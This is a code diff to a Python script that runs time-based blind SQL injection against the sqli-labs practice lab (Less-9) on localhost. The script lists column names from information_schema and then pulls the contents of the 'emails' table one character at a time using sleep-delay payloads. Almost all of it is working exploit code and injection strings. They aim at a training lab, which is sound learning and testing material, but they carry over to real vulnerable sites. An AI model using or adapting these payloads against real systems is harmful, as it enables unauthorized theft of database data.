@@ -49,9 +49,27 @@ tb=tables.split(',')
 url_clen="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat(column_name)) from information_schema.columns where table_name='{}')={},sleep(1),null)--+"
 url_col="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat(column_name) from information_schema.columns where table_name='{}'),{},1)='{}',sleep(1),null)--+"
 
+cl=[]
 for t in tb:                        #finding columns
     pl=url_clen.format(t,{})
     l=le(pl)
     p=url_col.format(t,{},{})
     columns=exploit(p,l)
-    print("columns in "+t+" are: "+columns)
+    print("columns in "+t+"are: "+columns)
+    cl.append(columns)
+
+emails=cl[0].split(',')
+referers=cl[1].split(',')
+uagents=cl[2].split(',')
+users=cl[3].split(',')
+
+
+for i in emails:
+    url_dl="http://localhost/sqli-labs-php7/Less-9/?id=1' and if((select length(group_concat({})) from emails)={},sleep(1),null)--+"
+    pl=url_dl.format(i,{})
+    l=le(pl)
+    url_data="http://localhost/sqli-labs-php7/Less-9/?id=1' and if(substr((select group_concat({}) from emails),{},1)='{}',sleep(1),null)--+"
+    p=url_data.format(i,{},{})
+    data=exploit(p,l)
+    print(i," : ",data)
+
